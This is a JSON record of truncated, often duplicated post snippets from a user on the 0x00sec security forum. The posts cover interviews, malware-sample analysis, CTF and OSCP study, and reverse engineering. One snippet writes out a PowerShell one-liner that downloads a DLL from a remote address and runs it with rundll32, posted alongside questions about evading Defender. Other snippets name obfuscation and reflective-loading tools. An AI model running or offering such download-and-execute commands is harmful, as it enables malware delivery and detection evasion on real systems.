{"user": "lkw", "history": ["sounds cool right? No. That’s a bit stupid IMO. Here’s my reaction when reading the project page: Meadow is the world’s first, modern, secure, professional IoT platform. Hum??? It combines the best of all worlds; it has the power of RaspberryPi, the computing factor of an Arduino No, thi&hellip;", "Bro, about damn time. @0x00pf is a long living legend, and he’s given so much to this community. Without members like Pico, this place wouldn’t exist today.", "I knew @0x00pf was an absolute titan but I didn’t know he was actually a God.", "Awesome to finally get a Knowing Null about @0x00pf, like @pry0cc said, would for sure not be the same without his amazing posts!", "Hello again!It’s been a while since the last Knowing Null. For those of you knew to the series, my name is skidd0 and Knowing Null is an interview series where I pester and prod the top minds of 0x00sec about themselves and then post it all publicly–a dream come true for us paranoid hackers! Today&hellip;", "This isn’t file-less because you’re dropping a file to disk. If you want to file-lessly execute a traditional PE file using PowerShell, you can reflectively load it using a module like Invoke-ReflectivePEInjection. I believe mshta is flagged by Defender so I assume that would not be a very easy meth&hellip;", "I’m not an expert, but I know pentesters that do this. While they don’t need to be signed by default I think this can be changed, but I don’t remember where. I think one of the main things people I know use is Invoke-Obfuscation to obfuscate powershell scripts. For actually running the script XSL&hellip;", "I’m not an expert, but I know pentesters that do this. While they don’t need to be signed by default I think this can be changed, but I don’t remember where. I think one of the main things people I know use is Invoke-Obfuscation to obfuscate powershell scripts. For actually running the script XSL&hellip;", "I’m not an expert, but I know pentesters that do this. While they don’t need to be signed by default I think this can be changed, but I don’t remember where. I think one of the main things people I know use is Invoke-Obfuscation to obfuscate powershell scripts. For actually running the script XSL&hellip;", "@dtm @Baud @lkw even with fileless malwares … for example when I use a simple : powershell -nop -c &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.5:8080/apt.dll&#39;, &#39;C:\\ProgramData\\a.dll&#39;) ;copy &#39;C:\\ProgramData\\a.dll&#39; &#39;C:\\ProgramData\\x.dll&#39; ;rundll32 C:\\ProgramData\\x.dll,Run &quot;The&hellip;", "I’m not an expert, but I know pentesters that do this. While they don’t need to be signed by default I think this can be changed, but I don’t remember where. I think one of the main things people I know use is Invoke-Obfuscation to obfuscate powershell scripts. For actually running the script XSL&hellip;", "I’m not an expert, but I know pentesters that do this. While they don’t need to be signed by default I think this can be changed, but I don’t remember where. I think one of the main things people I know use is Invoke-Obfuscation to obfuscate powershell scripts. For actually running the script XSL&hellip;", "The easiest option I can think of is fileless malware: malicious code that is loaded into memory without being stored on the disk. This kind of malicious code works by being passed on to a trusted program, typically PowerShell, through a delivery method that is usually a web page containing JavaScri&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "Nice! Secure interoperability between different systems seems to be a bit of an issue. Reminds me of attacks using discrepancies between url parsing and email address handling. I think I wouldn’t be surprised to see a lot more of this in the future.", "Nice! Secure interoperability between different systems seems to be a bit of an issue. Reminds me of attacks using discrepancies between url parsing and email address handling. I think I wouldn’t be surprised to see a lot more of this in the future.", "Nice! Secure interoperability between different systems seems to be a bit of an issue. Reminds me of attacks using discrepancies between url parsing and email address handling. I think I wouldn’t be surprised to see a lot more of this in the future.", "DISCLAIMER: Article originally published on immunIT  Hi fellas, I’m exiting to introduce you to a new vulnerability found by my colleague (Xel) and me during one of our pentesting engagements  I almost had my first CVE on Wordpress a year ago but now here we are! Vulnerability summaryDue to &hellip;", "I haven’t done too much on htb yet mostly due to lack of time. Also I find people messing up the boxes and resets can be a pain. I’ve heard people say that some of the htb boxes are similar to OSCP and some were inspired by OSCP boxes, though I’ve also heard people say it’s a bit more ctf-y than OS&hellip;", "I haven’t done too much on htb yet mostly due to lack of time. Also I find people messing up the boxes and resets can be a pain. I’ve heard people say that some of the htb boxes are similar to OSCP and some were inspired by OSCP boxes, though I’ve also heard people say it’s a bit more ctf-y than OS&hellip;", "Hello, 0x00ers! As you may have heard me talk about before, I am a strong advocate of using labs and CTF platforms for learning to hack and learning the skills involved in performing pentests from day to day. I believe they’re a great way to learn new skills, practice and validate your enumeration&hellip;", "Performing a MITM attack on the .NETGuard desktop applicationAuthors:Washi, 766F6964 Abstract:Code obfuscation is a method of preventing third parties from reverse engineering the inner workings of software. One cloud-based service that provides this kind of protection for .NET applications is .&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "Note: Multiple edits for typos (the ghost of a learning disability mostly overcome) and additional image upload occurred between 21:10 EST, 9/30/18 &amp; 22:23 EST 9/30/18 Last year I released the essay Shared thoughts after 6+ years in pentesting: (Shared thoughts after 6+ years in Pentesting). I dec&hellip;", "This week’s guest: @REal0day!Professional career and adviceHello REal0day. Thanks for participating today! For starters, can you tell us a bit about yourself and your current role/job/work? I’m a Security Researcher at a startup that specializes in asset discovery and vulnerability assessment f&hellip;", "Hello everyone, Following from Robot hacking: the Robot Security Framework (RSF) and seeing the good reception it had, I’m sharing here another piece of our work that’s been made publicly available: The Robot Vulnerability Scoring System (RVSS) is an open and free to access vulnerability scoring s&hellip;", "Everyone give a big hands up, thump up, sexual massage or big lovin to our resident matey boy @Leeky for REKIN flare-on check his scores!  [ef3090676d0c76993e98ca1c3504629b]Leeky&gt; 250 hours over 2 months! I have never been so sore but it was worth it in the end, even if it did end up so sticky L&hellip;", "Since I haven’t been so active in the past few months because of my lack of time, I’m coming back with some new knowledge to spread around. The 0x00sec drone is on the way to be accomplished right? So why not understand how drones generally work and even build your own. Disclaimer: All the informat&hellip;", "Hey all a small c# challenge RE I made for leeky and lkw on IRC, they appeared to like it! so I thought I would post it here. My first try at writing one of these so feedback welcome  https://1drv.ms/u/s!AkvwG6Qrk79x3Th-paeLebwfmC_y Good luck have fun  The archive type is 7zip availible here: ht&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "I have some links to more information on the last slide. The main thing I would recommend is this free book. Also, do challenges, I’d start with the ones provided under crackmes.", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "I have some links to more information on the last slide. The main thing I would recommend is this free book. Also, do challenges, I’d start with the ones provided under crackmes.", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "DISCLAIMER: Article originally published on immunIT. Hi fellas, Today, I will introduce you to a new tool, developed for the sake of one of my pentesting engagement, named XIP. XIP claims to provide an efficient way to generate a list of IP addresses, using a set of mutations, in order to bypas&hellip;", "What’s up, everyone? This tutorial will show you how to configure your own vulnerable CTF server manually. There exist some scripts which do this job for you but it’s much better when you understand why these vulnerabilities work.  Before we start I recommend you document every change/step. Write &hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Hi A while ago I did a presentation on reverse engineering for a group at a local uni. I thought the slides and binaries I used could be useful, so I’m posting it here. I’d like to point out that many of the binaries I used are not mine, many came from skidophrenia which was hosted on ctfd.io by @&hellip;", "Everything on that list is a bad norm of Vegas except “corporatism”. I usually judge hacker gatherings on six spectrums. Who is the gathering intended for? Underground Anon Hackers to Watchlist HackersNon-Anon Hackers to Well-Known HackersHackers to Hacker Businesses and Hacker Businesses to H&hellip;", "From what I’ve done in HTB all the boxes are on a single subnet, don’t depend on each other, don’t require pivoting, etc… This is one of the main things I think will be cool about doing OSCP", "Hi there!  Thanks for a fun challenge! I’m sharing here the clear-text code in its final stage  As a malware researcher, I encounter tons of examples as this. My main method is to clean the noise and let the malicious code to decrypt itself. If there’ll be a request I’ll write you a write-up of how&hellip;", "So I found the below piece of code in my webhost account, it was smart enough to overwrite my default index.html and replaced it with index.php containing the below code which got executed each time someone hit the website without showing any signs of hacks to the end user. Turns out my ftp usernam&hellip;", "Thank you man! That was my intention  I’ll make sure to keep the people here updated with all the latest techniques that I learn.", "Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwoHi! I hope you’re well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you’re new to security,&hellip;", "Exactly 100 days ago from my writing this, my lab access for Penetration Testing With Kali (PWK) began. PWK is a course offered by Offensive Security intended to prepare you for the OSCP certification exam, a grueling 24 hour endeavor where you must hack roughly 4 out of 5 computers assigned to you &hellip;", "In fact mate @colental, you should definitely do a write-up here on your tool. How to use it and how you’ve designed it. That would be amazing.", "https://github.com/colental/byob Built this to teach myself Python. Any thoughts?", "I spoke about my thoughts on this project on twitter and I disagree with what a lot of people are saying. Learning this kind of thing is really useful to understanding how a C2 works. This is the entire thing of offensive security. Good job dude! This could even be used for engagements to demons&hellip;", "I’m going to chime in on this. For those of you who don’t know me,  I’m L0k1, I run our IRC,  and our Gitlab,  as well as a few other things. I may not be around all the time,  but I’m constantly maintaining stuff.  Before the talks about switching to Discord,  before we had our own IRC,  we were &hellip;", "Well, a few things     Maybe I’m a bloody asshole, dickhead or whatever but, …, honestly, I think that using a cloud based solution like discord go against the principle of privacy. I really hope that the IRC will NEVER be shutdowned. Cya on IRC. Best, Nitrax", "i3wm &lt;3  [fake-dirty] [coding-area]", "Welcome Back to Knowing Null!This week, you voted to bring in ricksanchez! Let’s just jump right into it.First, I’d like to thank you for joining this series of course, anytime  If people really feel the urge to get toknow more about me this is the perfect chance! Can you tell me and the read&hellip;", "Ok, I’m done customizing my final setup. Here are some screenshots. Would like to hear @pry0cc’s and @fi6uh’s rating especially! I run ArcoLinuxB, which is basically Arch Linux with some themes and configs included. I debloated it using their BYOI project and further customized my shell with zsh an&hellip;", "[2018-07-22-151915_1920x1080_scrot]Solarized + suckless", "Thanks! I actually used m2crypto to generate the p and g parameters for diffie-hellman, since that was something I didn’t want to implement myself. I know m2crypto can do the whole process, but what @lkw said is correct, I wanted to try doing it myself so I could learn. It’s a great library though,&hellip;", "I think part of the point of the post was to implement the crypto to see how it could work instead of using an openssl wrapper.", "You probably know this, but to add to @spec’s answer, the ways I am aware of for host verification (there may be others) are Manually adding trusted keys/certificatesKey pinning - kind of like 1 but adding the hash of the key instead and check that the has of the received key matchesCertificate &hellip;", "I think part of the point of the post was to implement the crypto to see how it could work instead of using an openssl wrapper.", "I think part of the point of the post was to implement the crypto to see how it could work instead of using an openssl wrapper.", "This post is part three of a multi-part series. If you haven’t already, please read parts one and two. It’s been a while…Sorry for the extreme (four month!) delay on this series. I got busy with other things and it became hard to return to it, being unsure if anyone would still be interested. Anyw&hellip;", "You probably know this, but to add to @spec’s answer, the ways I am aware of for host verification (there may be others) are Manually adding trusted keys/certificatesKey pinning - kind of like 1 but adding the hash of the key instead and check that the has of the received key matchesCertificate &hellip;", "You probably know this, but to add to @spec’s answer, the ways I am aware of for host verification (there may be others) are Manually adding trusted keys/certificatesKey pinning - kind of like 1 but adding the hash of the key instead and check that the has of the received key matchesCertificate &hellip;", "Just curious, is this secure against MitM? AFAIK, DH alone isn’t enough for that.", "Although the message contents are encrypted when sent over the network and can’t be read without the key, there’s no way for the client to verify the validity of the host they’re connecting to. Therefore, if an attacker pretends to be the server, they could intercept the components of the shared key&hellip;", "Nice write-up man.  Got a few noob questions.  I’ve never really delved into kernel-mode dev before.  How would this be inserted? I’m assuming it’s just along the lines of the normal process of installing a regular driver?   If so, does it need to be done with some sort of driver signing bypassing t&hellip;", "Yep, if you look in the demonstration section, I’ve used OSR Loader to install the driver as a service with the type Minifilter (you can’t see it in the screen capture). Currently the driver is installed under a “test mode” environment which allows test-signed drivers to be loaded but for real-world&hellip;", "Hey guys, back with just another casual article from me this time around since one of my projects failed miserably and I don’t really have the time for another serious one. Also I’ve getting into something new, as you may have already guessed, kernel-mode development! Yeah, pretty exciting stuff and&hellip;", "How does malware discover the server and by what means?", "I want to set this up with Google cloud with a packer image. Hopefully we can introduce the magic of DevOps through this @fraq Anyway, good job dude! Nice article", "These are all correct. This is how one discovers your vuln server. Scanning IPs, fingerprinting, and then (usually) auto-executing an exploit and dropping malware on your server.", "Would be extremely careful with setting up honeypot on home network. Couple thoughts would be to make sure your honeypot is an isolated vlan on a dd-wrt router. Set it on the home dmz with firewall behind it to allow not traffic into the network from it.", "The BEST unit of measurement.", "Hey! I guess I’m a unit of measurement. That’s cool.", "Hey guys, as you may or may not know, I developed an application dubbed “NoREpls” for the purposes of teaching Windows reverse engineering as a side project. It’s been a while since its debut here so I’ve decided to finally upload its source on my GitHub page here: https://github.com/NtRaiseHardErro&hellip;", "In addition to what @Evalion suggested, if the server gets indexed in Shodan it could be discovered through Shodan’s API. E.g. see autosploit", "These are all correct. This is how one discovers your vuln server. Scanning IPs, fingerprinting, and then (usually) auto-executing an exploit and dropping malware on your server.", "In addition to what @Evalion suggested, if the server gets indexed in Shodan it could be discovered through Shodan’s API. E.g. see autosploit", "One possibility I can think of is that it scans different IP ranges and then tries automated exploits on them.", "IntroductionThis paper is how to setup your own Honeypot (dionaea). I would say most of us like Reverse Engineering binaries. Many of us have a fascination with malware. Why not combine them and RE some Malware that’s actively being used for exploitation? My tutorial is how to setup a honeypot on &hellip;", "The difference between evolution and devolution is simply a matter of perspective", "Welcome back to Knowing NullKnowing Null is a series of interviews randomly conducted on the 0x00sec IRC server and compiled here for your convenience. Today’s guest is the ever present pry0cc! But, first, a poll! Who do you want to see next time?fraqdtmricksanchezzSecsprtn0x00pfPhoenix&hellip;", "We spend a lot of time talking about the obvious infosec tools like fuzzers, VPNs, key loggers, and the “sexy” things. However, there are quite a few useful tools out there that can be used to maintain your lab, help your research, and help you get stuff done faster. PackerPacker by Hasicorp is fo&hellip;", "I’m not a genie. Also, I don’t think it’s possible to “see” a markov chains bot.", "One of the admins (IRC) side for this network, she is apparently quite beautiful; I am just curious", "Who is this “suser” person? I’ve never seen them around on this forum before.", "I want to know what suser looks like", "Exploitation in 2018 - How Pentesting Has ChangedHi 0x00sec! This is the next installment of my pentesting series. If you missed my last two articles, you can read the first one here and the second one here. They are heavily OSINT focussed, and naturally, the next article should be about active rec&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "From what I understand the original file was clean?", "We didn’t spend as much time analyzing the keygen that it dropped, however I think it is probably not infected (I didn’t see anything obviously bad in my quick looks). I have seen the keygen on the internet without the malware dropper. I think it is likely that the malware author found the keygen an&hellip;", "We didn’t spend as much time analyzing the keygen that it dropped, however I think it is probably not infected (I didn’t see anything obviously bad in my quick looks). I have seen the keygen on the internet without the malware dropper. I think it is likely that the malware author found the keygen an&hellip;", "This was an absolutely amazing example of catching malware in the wild and reversing it. However, I’d like to address what i’m seeing in the comments: Let’s discuss the work that @lkw and friends performed here and not use this as a support thread to ask for help with the malware you discovered. Ta&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "As we start to see an influx of articles, can we get a couple of native english English-speaking volunteers to go through and edit each post (While while working closely with the author, of course) to ensure proper grammar and flow for easy reading, especially for those who’s whose first language is&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "If you’re familiar with the Damn Vulnerable Web App (DVWA) then you will love this. It’s called Hackazon and in its own words: Hackazon is a free, vulnerable test site that is an online storefront built with the same technologies used in today’s rich client and mobile applications. Hackazon has an&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "Freestyle February: A 0x00sec Article ContestHello 0x00ers! The 0x00sec Staff is happy to announce our first annual Freestyle February! Here’s how it works: Take up until the last day of February to research something technical, something from which the 0x00sec community might benefit. Then, po&hellip;", "Great work guys! Nice stuff!", "I used this as a tutorial to learn about reversing obfuscation code. Great write up sorry i cant help beyond that", "This is amazing. This is what an awesome hacking community like this does. Good job everybody involved!", "Fun little read. Nice job", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "IIRC, the command was Get-Variable | format-list Name, Value &gt;dump.txtwhich does, unfortunately, truncate the variables. If you want the full values, you can use this (generates ugly unformated output): Get-Variable | Select -Expand Value &gt;dump.txt", "IIRC, the command was Get-Variable | format-list Name, Value &gt;dump.txtwhich does, unfortunately, truncate the variables. If you want the full values, you can use this (generates ugly unformated output): Get-Variable | Select -Expand Value &gt;dump.txt", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "DISCLAIMER: The following post contains a virus sample. If you decide to mess with it you do so at your own risk. Do not go running it on your computer, at least use a VM. Some random new “user” called @the_heat_man posted some files on the forums multiple times (after being deleted by mods) calimi&hellip;", "Don’t Download From Untrusted Links!If it’s not from the people who wrote it, it’s untrusted. I know this sounds like super basic stuff but we’ve had to delete/unlist a few posts recently where people (I’m talking about you, @the_heat_man) are posting sketchy links to download tools instead of poi&hellip;", "PrefaceHey there! After quite some time the second part will be finally published  ! Sorry for the delay, real life can be overwhelming ;)… Last time I have introduced this series by covering Data Execution Prevention (DEP). Today we’re dealing with the next big technique. As the title already&hellip;", "READMEIf your antivirus detects this page as malicious, it is most probably because I have pasted some scripts into the article. Do not be alarmed! IntroductionVery recently I’ve (finally) set up a proper malware analysis VM and so I thought that it would be super fun to download some samples fro&hellip;", "There is a huge array of topics that underlies the working innards of a modern computer. Please free to share your favorite references/books on any topic relating to Computer Science. EDIT: PROVIDE A SMALL DESCRIPTION/REVIEW if you’ve read the book or know it had helped others Discrete Mathematic&hellip;"]}